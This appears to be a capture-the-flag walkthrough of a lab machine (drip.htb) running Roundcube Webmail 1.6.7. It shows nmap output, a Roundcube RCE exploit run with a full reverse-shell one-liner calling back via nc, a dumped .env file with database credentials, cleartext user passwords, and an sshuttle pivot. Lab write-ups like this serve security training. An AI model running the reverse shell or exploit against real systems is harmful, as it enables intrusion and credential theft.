
![](Dark_corp-bg.png)

## INFO


```nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Site doesn't have a title (text/html).
```


``` Domaain
10.10.11.54     drip.htb  mail.drip.htb
```

Its RoundCube WebMail Server ; Lets register and login- to the portal for more info.


``` RoundCube_Version
Roundcube Webmail 1.6.7
```

This version of Rouncube is vulnerable to CVE-2024-4200 and CVE-2025-49113

CVE-2025-49113 is a dangerous exploit , just need a valid user and boom , but this aint the intended path , Check the exploit we get direct [RCE](https://github.com/hakaioffsec/CVE-2025-49113-exploit) 

CVE-2024-4200 , attacker can inject malicious JavaScript in a message and take advantage of a desanitization issue when parsing the HTML inside the message, which then can be used to exfiltrate email content from the victim's inbox. [XSS](https://github.com/DaniTheHack3r/CVE-2024-42009-PoC)


### Unintended RCE [CVE-2025-49113]

```
php CVE-2025-49113.php http://mail.drip.htb/ admin admin "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.204 1337 >/tmp/f"
```

Once we get the RCE Search for juicy things....

```
www-data@drip:/var/www/html/dashboard$ cat .env

# If DB credentials (if NOT provided, or wrong values SQLite is used) 
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432

SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
```


Get Shell as postgres user and check /var/backups/postgres Then decrypt the file with GPG -> dev-dripmail.sql where we retrive usernames and hashes along with that.


## USER_ACCESS 

Once we got the doamin user credentials ; Now its time to pwn the AD.

```
ebelford :: ThePlague61780

victor.r :: victor1gustavo@#
```


```sshuttle
sshuttle -r ebelford@drip.htb 172.16.20.0/24
```

